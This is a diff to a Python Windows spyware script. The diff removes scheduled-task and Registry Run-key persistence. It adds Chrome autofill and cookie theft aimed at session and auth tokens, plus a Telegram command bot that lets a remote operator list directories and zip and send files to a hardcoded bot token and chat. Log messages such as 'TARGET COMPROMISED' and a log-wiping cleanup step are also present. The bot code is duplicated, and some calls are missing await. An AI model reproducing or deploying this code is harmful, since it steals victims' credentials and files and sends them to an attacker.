@@ -18,7 +18,6 @@ import browserhistory as bh
 import sqlite3
 import base64
 import win32crypt
-import sys
 from multiprocessing import Process
 from pynput.keyboard import Key, Listener
 from PIL import ImageGrab
@@ -27,7 +26,8 @@ from cryptography.fernet import Fernet
 import tempfile
 import psutil
 from Crypto.Cipher import AES
-import winreg
+from telegram.ext import Updater, CommandHandler
+import telegram
 
 ################ Configuration: Base Path and Default Settings ################
 
@@ -39,116 +39,6 @@ BASE_LOG_PATH.mkdir(parents=True, exist_ok=True)
 # Telegram Configuration
 BOT_TOKEN = "6622438559:AAEGqBZnIYwNth3FhtkOSwQEeRMe8nyv660"
 CHAT_ID = "2119992330"
-
-################ Persistence Functions - MATCHES TECHNIQUE 2 ################
-
-def install_persistence():
-    """Install persistence using Windows Task Scheduler and Registry Run keys"""
-    try:
-        # Get current script path
-        current_script = os.path.abspath(sys.argv[0])
-        
-        # Check if script has .py extension
-        if current_script.endswith('.py'):
-            # Create a hidden copy with .pyw extension for silent execution
-            script_name = os.path.basename(current_script)
-            new_name = script_name.replace('.py', '.pyw')
-            
-            # Copy to AppData for stealth
-            appdata_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Startup')
-            os.makedirs(appdata_path, exist_ok=True)
-            
-            persistent_path = os.path.join(appdata_path, new_name)
-            
-            # Copy the script to AppData
-            shutil.copy2(current_script, persistent_path)
-            
-            # Convert to .pyw if needed
-            if persistent_path.endswith('.py'):
-                pyw_path = persistent_path.replace('.py', '.pyw')
-                os.rename(persistent_path, pyw_path)
-                persistent_path = pyw_path
-        else:
-            persistent_path = current_script
-        
-        send_telegram_message("🔧 <b>Installing persistence mechanisms...</b>")
-        
-        # TECHNIQUE 2: Task Scheduler Persistence (Primary Method)
-        try:
-            # Create hidden startup task
-            task_name = "WindowsSystemUpdate"
-            task_command = f'wscript.exe //B //E:python "{persistent_path}"'
-            
-            # Create scheduled task for system startup
-            startup_cmd = [
-                'schtasks', '/create', '/tn', task_name,
-                '/tr', task_command,
-                '/sc', 'onstart',
-                '/ru', 'SYSTEM',
-                '/rl', 'HIGHEST',
-                '/f'
-            ]
-            
-            # Execute the command
-            result = subprocess.run(startup_cmd, capture_output=True, text=True, shell=True)
-            
-            if result.returncode == 0:
-                send_telegram_message(f"✅ <b>Task Scheduler persistence installed:</b>\nTask Name: {task_name}")
-            else:
-                # Try with current user if SYSTEM fails
-                startup_cmd_user = [
-                    'schtasks', '/create', '/tn', task_name,
-                    '/tr', task_command,
-                    '/sc', 'onstart',
-                    '/ru', WINDOWS_USERNAME,
-                    '/rl', 'HIGHEST',
-                    '/f'
-                ]
-                subprocess.run(startup_cmd_user, capture_output=True, text=True, shell=True)
-                send_telegram_message(f"✅ <b>Task Scheduler installed (User context):</b>\nTask Name: {task_name}")
-        
-        except Exception as e:
-            send_telegram_message(f"⚠️ <b>Task Scheduler failed:</b> {str(e)[:100]}")
-        
-        # Create additional daily task for redundancy
-        try:
-            daily_task_name = "SystemHealthMonitor"
-            daily_cmd = [
-                'schtasks', '/create', '/tn', daily_task_name,
-                '/tr', task_command,
-                '/sc', 'daily',
-                '/st', '00:00',
-                '/f'
-            ]
-            subprocess.run(daily_cmd, capture_output=True, text=True, shell=True)
-        except:
-            pass
-        
-        # Additional persistence: Registry Run Key (Backup Method)
-        try:
-            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
-            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
-            winreg.SetValueEx(key, "WindowsUpdateService", 0, winreg.REG_SZ, persistent_path)
-            winreg.CloseKey(key)
-            send_telegram_message("✅ <b>Registry Run key added</b>")
-        except Exception as e:
-            pass
-        
-        return True
-        
-    except Exception as e:
-        send_telegram_message(f"❌ <b>Persistence installation failed:</b>\n{str(e)[:200]}")
-        return False
-
-def check_if_already_installed():
-    """Check if persistence is already installed to avoid duplicates"""
-    try:
-        # Check for scheduled task
-        check_cmd = 'schtasks /query /tn "WindowsSystemUpdate" 2>nul'
-        result = subprocess.run(check_cmd, shell=True, capture_output=True, text=True)
-        return result.returncode == 0
-    except:
-        return False
 
 ################ Telegram Enhanced Functions ################
 
@@ -440,26 +330,299 @@ def extract_and_send_chrome_passwords(file_path):
         send_telegram_message(f"❌ <b>CHROME PASSWORD EXTRACTION FAILED:</b>\n{str(e)[:200]}")
         return None
 
-################ Updated Main Function with Persistence ################
+################ Other Chrome Data Functions ################
 
+def get_chrome_autofill():
+    """Extract autofill data from Chrome"""
+    autofill_data = []
+    try:
+        chrome_path = os.path.join(
+            os.environ['USERPROFILE'],
+            'AppData', 'Local', 'Google', 'Chrome',
+            'User Data', 'Default', 'Web Data'
+        )
+        
+        if os.path.exists(chrome_path):
+            temp_db = os.path.join(str(BASE_LOG_PATH), 'chrome_autofill.db')
+            shutil.copy2(chrome_path, temp_db)
+            
+            conn = sqlite3.connect(temp_db)
+            cursor = conn.cursor()
+            
+            # Get autofill data
+            cursor.execute("""
+                SELECT name, value, date_created, count 
+                FROM autofill 
+                WHERE value != '' 
+                ORDER BY count DESC, date_created DESC
+                LIMIT 100
+            """)
+            
+            for row in cursor.fetchall():
+                field = row[0]
+                value = row[1]
+                
+                # Filter sensitive data
+                sensitive_fields = ['credit', 'card', 'cvv', 'ssn', 'password', 'secret']
+                if any(sensitive in field.lower() for sensitive in sensitive_fields):
+                    continue
+                    
+                autofill_data.append({
+                    'field': field,
+                    'value': value,
+                    'count': row[3]
+                })
+            
+            conn.close()
+            os.remove(temp_db)
+            
+    except Exception as e:
+        logging.error(f'Chrome autofill extraction error: {e}')
+    
+    return autofill_data
+
+def get_chrome_cookies():
+    """Extract cookies from Chrome"""
+    cookies = []
+    try:
+        chrome_path = os.path.join(
+            os.environ['USERPROFILE'],
+            'AppData', 'Local', 'Google', 'Chrome',
+            'User Data', 'Default', 'Cookies'
+        )
+        
+        if os.path.exists(chrome_path):
+            temp_db = os.path.join(str(BASE_LOG_PATH), 'chrome_cookies.db')
+            shutil.copy2(chrome_path, temp_db)
+            
+            conn = sqlite3.connect(temp_db)
+            cursor = conn.cursor()
+            
+            # Get important cookies
+            cursor.execute("""
+                SELECT host_key, name, encrypted_value, path
+                FROM cookies 
+                WHERE (host_key LIKE '%google.com' 
+                       OR host_key LIKE '%facebook.com'
+                       OR host_key LIKE '%github.com'
+                       OR host_key LIKE '%twitter.com'
+                       OR name LIKE '%session%'
+                       OR name LIKE '%token%'
+                       OR name LIKE '%auth%')
+                AND encrypted_value != ''
+                ORDER BY length(encrypted_value) DESC
+                LIMIT 50
+            """)
+            
+            for row in cursor.fetchall():
+                try:
+                    # Try to decrypt the cookie
+                    decrypted = win32crypt.CryptUnprotectData(row[2], None, None, None, 0)[1]
+                    cookie_value = decrypted.decode('utf-8', errors='ignore')
+                except:
+                    cookie_value = "[ENCRYPTED]"
+                
+                cookies.append({
+                    'domain': row[0],
+                    'name': row[1],
+                    'value': cookie_value[:100],
+                    'path': row[3]
+                })
+            
+            conn.close()
+            os.remove(temp_db)
+            
+    except Exception as e:
+        logging.error(f'Chrome cookies extraction error: {e}')
+    
+    return cookies
+
+################ Updated Main Function with Chrome Decryption ################
+
+################ Telegram Directory Bot ################
+
+def telegram_bot():
+    """Persistent directory navigation bot with zip capabilities"""
+    import os
+    import shutil
+    import time
+    import logging
+    from telegram import Update
+    from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters
+    
+    current_dir = os.path.expanduser('~')
+    zip_dir = os.path.join(str(BASE_LOG_PATH), 'telegram_zips')
+    os.makedirs(zip_dir, exist_ok=True)
+
+    async def start(update: Update, context):
+        await update.message.reply_text(f"""
+🤖 <b>Directory Bot Commands:</b>
+/list [path] - List directory contents
+/cd [path] - Change current directory
+/zip [path] - Zip and send directory/file
+Current directory: {current_dir}
+        """, parse_mode='HTML')
+
+    async def list_dir(update: Update, context):
+        nonlocal current_dir
+        path = ' '.join(context.args) if context.args else current_dir
+        full_path = os.path.abspath(os.path.join(current_dir, path))
+        
+        if not os.path.exists(full_path):
+            await update.message.reply_text("❌ Path does not exist")
+            return
+
+        try:
+            items = []
+            for entry in os.listdir(full_path):
+                entry_path = os.path.join(full_path, entry)
+                items.append(f"{'📁' if os.path.isdir(entry_path) else '📄'} {entry}")
+            
+            response = "\n".join(items[:50])  # Limit to 50 items
+            if len(items) > 50:
+                response += "\n... (showing first 50 items)"
+                
+            update.message.reply_text(f"""
+📂 <b>Directory Listing:</b> {full_path}
+━━━━━━━━━━━━━━━━━━━━━━━━━
+{response}
+            """, parse_mode='HTML')
+            
+        except Exception as e:
+            logging.error(f"List error: {e}")
+            update.message.reply_text("❌ Error listing directory")
+
+    async def change_dir(update: Update, context):
+        nonlocal current_dir
+        new_dir = ' '.join(context.args) if context.args else ''
+        full_path = os.path.abspath(os.path.join(current_dir, new_dir))
+        
+        if os.path.isdir(full_path):
+            current_dir = full_path
+            await update.message.reply_text(f"📂 Changed to: {current_dir}")
+        else:
+            await update.message.reply_text("❌ Directory does not exist")
+
+    async def zip_dir_cmd(update: Update, context):
+        target = ' '.join(context.args) if context.args else current_dir
+        full_path = os.path.abspath(os.path.join(current_dir, target))
+        
+        if not os.path.exists(full_path):
+            await update.message.reply_text("❌ Target does not exist")
+            return
+
+        try:
+            base_name = os.path.basename(full_path) or "archive"
+            zip_path = os.path.join(zip_dir, f"{base_name}_{int(time.time())}.zip")
+            shutil.make_archive(zip_path[:-4], 'zip', full_path)
+            
+            with open(zip_path, 'rb') as f:
+                context.bot.send_document(
+                    chat_id=update.effective_chat.id,
+                    document=f,
+                    caption=f"📦 Zipped: {full_path}"
+                )
+        except Exception as e:
+            logging.error(f"Zip error: {e}")
+            update.message.reply_text("❌ Error creating zip archive")
+
+    def main_bot():
+        application = ApplicationBuilder().token(BOT_TOKEN).build()
+
+        application.add_handler(CommandHandler("start", start))
+        application.add_handler(CommandHandler("list", list_dir))
+        application.add_handler(CommandHandler("cd", change_dir))
+        application.add_handler(CommandHandler("zip", zip_dir_cmd))
+
+        application.run_polling()
+
+    main_bot()
 def main():
     try:
-        # === CHECK FOR ARGUMENTS ===
-        if len(sys.argv) > 1 and sys.argv[1] == "--install-only":
-            # Only install persistence and exit
-            install_persistence()
-            return
-        
-        # === PHASE 0: PERSISTENCE INSTALLATION ===
-        send_telegram_message("🚀 <b>SPYWARE INITIALIZATION STARTED</b>")
-        
-        # Check if already installed
-        if not check_if_already_installed():
-            install_persistence()
-            send_telegram_message("✅ <b>Persistent spyware installation complete</b>")
-        else:
-            send_telegram_message("🔄 <b>Spyware already installed - Running scheduled execution</b>")
-        
+        # Initialize Telegram bot components
+        current_dir = os.path.expanduser('~')
+        zip_dir = os.path.join(str(BASE_LOG_PATH), 'telegram_zips')
+        os.makedirs(zip_dir, exist_ok=True)
+
+        # Define bot command handlers
+        async def start(update: Update, context):
+            await update.message.reply_text(f"""
+🤖 <b>Directory Bot Commands:</b>
+/list [path] - List directory contents
+/cd [path] - Change current directory
+/zip [path] - Zip and send directory/file
+Current directory: {current_dir}
+            """, parse_mode='HTML')
+
+        async def list_dir(update: Update, context):
+            path = ' '.join(context.args) if context.args else current_dir
+            full_path = os.path.abspath(os.path.join(current_dir, path))
+            
+            if not os.path.exists(full_path):
+                await update.message.reply_text("❌ Path does not exist")
+                return
+
+            try:
+                items = []
+                for entry in os.listdir(full_path):
+                    entry_path = os.path.join(full_path, entry)
+                    items.append(f"{'📁' if os.path.isdir(entry_path) else '📄'} {entry}")
+                
+                response = "\n".join(items[:50])
+                if len(items) > 50:
+                    response += "\n... (showing first 50 items)"
+                    
+                await update.message.reply_text(f"""
+📂 <b>Directory Listing:</b> {full_path}
+━━━━━━━━━━━━━━━━━━━━━━━━━
+{response}
+                """, parse_mode='HTML')
+                
+            except Exception as e:
+                logging.error(f"List error: {e}")
+                await update.message.reply_text("❌ Error listing directory")
+
+        async def change_dir(update: Update, context):
+            nonlocal current_dir
+            new_dir = ' '.join(context.args) if context.args else ''
+            full_path = os.path.abspath(os.path.join(current_dir, new_dir))
+            
+            if os.path.isdir(full_path):
+                current_dir = full_path
+                await update.message.reply_text(f"📂 Changed to: {current_dir}")
+            else:
+                await update.message.reply_text("❌ Directory does not exist")
+
+        async def zip_dir_cmd(update: Update, context):
+            target = ' '.join(context.args) if context.args else current_dir
+            full_path = os.path.abspath(os.path.join(current_dir, target))
+            
+            if not os.path.exists(full_path):
+                await update.message.reply_text("❌ Target does not exist")
+                return
+
+            try:
+                base_name = os.path.basename(full_path) or "archive"
+                zip_path = os.path.join(zip_dir, f"{base_name}_{int(time.time())}.zip")
+                shutil.make_archive(zip_path[:-4], 'zip', full_path)
+                
+                with open(zip_path, 'rb') as f:
+                    await context.bot.send_document(
+                        chat_id=update.effective_chat.id,
+                        document=f,
+                        caption=f"📦 Zipped: {full_path}"
+                    )
+            except Exception as e:
+                logging.error(f"Zip error: {e}")
+                await update.message.reply_text("❌ Error creating zip archive")
+
+        # Initialize Telegram bot instance
+        application = ApplicationBuilder().token(BOT_TOKEN).build()
+        application.add_handler(CommandHandler("start", start))
+        application.add_handler(CommandHandler("list", list_dir))
+        application.add_handler(CommandHandler("cd", change_dir))
+        application.add_handler(CommandHandler("zip", zip_dir_cmd))
+
         # Create logs directory
         file_path = str(BASE_LOG_PATH)
         pathlib.Path(file_path).mkdir(parents=True, exist_ok=True)
@@ -469,14 +632,14 @@ def main():
         IPAddr = socket.gethostbyname(hostname)
         
         send_telegram_message(f"""
-🎯 <b>TARGET ACQUIRED - PERSISTENT SPYWARE ACTIVE</b>
-━━━━━━━━━━━━━━━━━━━━━━━━━━
+🎯 <b>TARGET ACQUIRED</b>
+━━━━━━━━━━━━━━━━━━━━
 👤 <b>User:</b> <code>{WINDOWS_USERNAME}</code>
 💻 <b>System:</b> <code>{hostname}</code>
 🌐 <b>IP:</b> <code>{IPAddr}</code>
 ⏰ <b>Time:</b> {time.strftime('%Y-%m-%d %H:%M:%S')}
-🚀 <b>Persistence:</b> Task Scheduler + Registry Run
-━━━━━━━━━━━━━━━━━━━━━━━━━━
+━━━━━━━━━━━━━━━━━━━━
+🚀 <b>Mission initialized...</b>
         """)
 
         # 1. SYSTEM INFORMATION
@@ -539,8 +702,6 @@ def main():
         
         # 3. SCREENSHOT AND WEBCAM CAPTURE
         send_telegram_message("📸 <b>Phase 3: Capturing images...</b>")
-        screenshot_path = None
-        webcam_path = None
         try:
             # Take screenshot
             screenshot_path = os.path.join(file_path, 'screenshot.png')
@@ -594,7 +755,7 @@ def main():
                 
         # 6. FINAL SUMMARY
         summary = f"""
-🎉 <b>PERSISTENT SPYWARE MISSION COMPLETE</b>
+🎉 <b>MISSION ACCOMPLISHED</b>
 ━━━━━━━━━━━━━━━━━━━━━━━━━━
 🎯 <b>TARGET PROFILE</b>
 ├─ 👤 User: <code>{WINDOWS_USERNAME}</code>
@@ -608,113 +769,23 @@ def main():
 ├─ ⌨️ Keystroke Logs
 └─ 📸 Screenshot
 ━━━━━━━━━━━━━━━━━━━━━━━━━━
-🔧 <b>PERSISTENCE INSTALLED:</b>
-├─ ✅ Task Scheduler: WindowsSystemUpdate (On Startup)
-├─ ✅ Task Scheduler: SystemHealthMonitor (Daily at 00:00)
-└─ ✅ Registry Run Key: WindowsUpdateService
-━━━━━━━━━━━━━━━━━━━━━━━━━━
-🚨 <b>TARGET PERMANENTLY COMPROMISED</b>
-• Spyware will auto-restart on reboot
-• Daily data collection scheduled
-• Full persistence established
+🚨 <b>TARGET COMPROMISED</b>
+• Passwords extracted and ready for use
+• Full system access obtained
+• Surveillance complete
 ━━━━━━━━━━━━━━━━━━━━━━━━━━
         """
         
         send_telegram_message(summary)
-        
-        # 7. START TELEGRAM BOT FOR INTERACTIVE ACCESS
-        send_telegram_message("🤖 <b>Starting interactive Telegram bot...</b>")
-        
-        # Telegram bot code (same as before)
-        current_dir = os.path.expanduser('~')
-        zip_dir = os.path.join(str(BASE_LOG_PATH), 'telegram_zips')
-        os.makedirs(zip_dir, exist_ok=True)
 
-        async def start(update: Update, context):
-            await update.message.reply_text(f"""
-🤖 <b>Spyware Control Panel - ACTIVE</b>
-━━━━━━━━━━━━━━━━━━━━━━
-👤 User: {WINDOWS_USERNAME}
-💻 System: {hostname}
-━━━━━━━━━━━━━━━━━━━━━━
-<b>Commands:</b>
-/list [path] - List directory contents
-/cd [path] - Change current directory
-/zip [path] - Zip and send directory/file
-Current directory: {current_dir}
-            """, parse_mode='HTML')
+        # 7. CLEANUP
+        try:
+            shutil.rmtree(file_path, ignore_errors=True)
+        except:
+            pass
 
-        async def list_dir(update: Update, context):
-            nonlocal current_dir
-            path = ' '.join(context.args) if context.args else current_dir
-            full_path = os.path.abspath(os.path.join(current_dir, path))
-            
-            if not os.path.exists(full_path):
-                await update.message.reply_text("❌ Path does not exist")
-                return
-
-            try:
-                items = []
-                for entry in os.listdir(full_path):
-                    entry_path = os.path.join(full_path, entry)
-                    items.append(f"{'📁' if os.path.isdir(entry_path) else '📄'} {entry}")
-                
-                response = "\n".join(items[:50])
-                if len(items) > 50:
-                    response += "\n... (showing first 50 items)"
-                    
-                await update.message.reply_text(f"""
-📂 <b>Directory Listing:</b> {full_path}
-━━━━━━━━━━━━━━━━━━━━━━━━━
-{response}
-                """, parse_mode='HTML')
-                
-            except Exception as e:
-                logging.error(f"List error: {e}")
-                await update.message.reply_text("❌ Error listing directory")
-
-        async def change_dir(update: Update, context):
-            nonlocal current_dir
-            new_dir = ' '.join(context.args) if context.args else ''
-            full_path = os.path.abspath(os.path.join(current_dir, new_dir))
-            
-            if os.path.isdir(full_path):
-                current_dir = full_path
-                await update.message.reply_text(f"📂 Changed to: {current_dir}")
-            else:
-                await update.message.reply_text("❌ Directory does not exist")
-
-        async def zip_dir_cmd(update: Update, context):
-            target = ' '.join(context.args) if context.args else current_dir
-            full_path = os.path.abspath(os.path.join(current_dir, target))
-            
-            if not os.path.exists(full_path):
-                await update.message.reply_text("❌ Target does not exist")
-                return
-
-            try:
-                base_name = os.path.basename(full_path) or "archive"
-                zip_path = os.path.join(zip_dir, f"{base_name}_{int(time.time())}.zip")
-                shutil.make_archive(zip_path[:-4], 'zip', full_path)
-                
-                with open(zip_path, 'rb') as f:
-                    await context.bot.send_document(
-                        chat_id=update.effective_chat.id,
-                        document=f,
-                        caption=f"📦 Zipped: {full_path}"
-                    )
-            except Exception as e:
-                logging.error(f"Zip error: {e}")
-                await update.message.reply_text("❌ Error creating zip archive")
-
-        # Start the bot
-        application = ApplicationBuilder().token(BOT_TOKEN).build()
-        application.add_handler(CommandHandler("start", start))
-        application.add_handler(CommandHandler("list", list_dir))
-        application.add_handler(CommandHandler("cd", change_dir))
-        application.add_handler(CommandHandler("zip", zip_dir_cmd))
-        
-        send_telegram_message("✅ <b>Interactive bot ready. Use /start to begin.</b>")
+        # 8. Start polling in non-blocking mode
+        send_telegram_message("🤖 <b>Directory navigation bot activated. Use commands:</b>\n/list [path] - List directory contents\n/cd [path] - Change directory\n/zip [path] - Zip and send directory/file")
         application.run_polling()
 
     except Exception as e:
@@ -724,7 +795,7 @@ Current directory: {current_dir}
 if __name__ == '__main__':
     try:
         # Test connection
-        send_telegram_message("🤖 <b>SYSTEM ONLINE</b>\nStarting persistent spyware installation...")
+        send_telegram_message("🤖 <b>SYSTEM ONLINE</b>\nStarting password extraction...")
         main()
         
     except KeyboardInterrupt:
